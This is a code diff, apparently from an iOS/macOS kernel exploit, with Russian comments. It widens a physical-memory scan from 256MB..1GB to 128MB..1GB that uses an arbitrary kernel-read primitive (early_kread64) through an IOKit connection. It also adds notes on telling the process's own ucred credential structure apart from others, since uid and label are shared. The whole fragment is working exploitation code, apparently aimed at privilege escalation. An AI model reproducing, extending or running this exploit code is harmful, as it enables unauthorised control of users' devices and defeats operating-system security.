@@ -8348,9 +8348,13 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                         // sig=0x5a5a5a5a на 0x10002f28000, темп 3 кадра/сек).
                         // Пол 256MB: смерть 05:58 была на PA 8..108MB.
                         if ((!pagePA || !roFieldPA)) {
-                            kpNote(r, @"  [SCAN-Z2-BAND] kernel-проход 256MB..1GB (whitelist + 0x37)");
+                            // 2.0.20: полоса 128MB..1GB (было 256MB..1GB) — дыра
+                            // 108-256MB никогда не читалась контент-сканом (там
+                            // только T18-кандидатки проверялись). Пол 128MB:
+                            // смерти были на 8..108MB.
+                            kpNote(r, @"  [SCAN-Z2-BAND] kernel-проход 128MB..1GB (все типы)");
                             uint64_t bandReads = 0;
-                            for (uint64_t li = (0x10000000ULL >> 14); li < (0x40000000ULL >> 14) && (!pagePA || !roFieldPA); li++) {
+                            for (uint64_t li = (0x8000000ULL >> 14); li < (0x40000000ULL >> 14) && (!pagePA || !roFieldPA); li++) {
                                 uint64_t lpa = pB + (li << 14);
                                 int lt = kpFrameTypeOf(lpa);
                                 BOOL lw = YES;   // 2.0.13: без фильтра, пол 256MB держит минное поле
@@ -8425,6 +8429,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                                               (unsigned long long)d3, (unsigned long long)labelQ]);
                                 }
                                 // идентичность: ucred_rw* (+0) объект-уникален
+                                // (label+uid НЕЛЬЗЯ — они общие у чужих ucred,
+                                // дамп 2.0.19 показал чужой ucred с тем же uid)
                                 uint64_t rw0 = early_kread64(alias + uoff2 + 0x00);
                                 uint64_t rwL = early_kread64(ucF + 0x00);
                                 uint32_t lu = (uint32_t)early_kread64(alias + uoff2 + 0x18);
